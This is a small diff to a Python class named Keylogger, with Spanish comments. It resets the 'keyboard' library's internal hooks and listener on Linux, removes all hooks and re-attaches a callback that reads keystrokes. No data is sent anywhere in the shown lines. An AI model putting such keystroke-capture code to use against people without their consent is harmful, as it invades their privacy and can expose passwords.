@@ -292,8 +292,12 @@ class Keylogger:
                 sleep(1)
                 keyboard._nixkeyboard.build_tables()
                 sleep(1)
-                #keyboard._listener = keyboard._KeyboardListener()
+                keyboard._hooks = {}
+                keyboard._listener = keyboard._KeyboardListener()
                 sleep(1)
+
+                # Vuelvo a quitar todos los hooks, esto activa eventos por defecto
+                keyboard.unhook_all()
 
                 # Añado de nuevo el hook para leer teclado
                 keyboard.hook(self.callback)
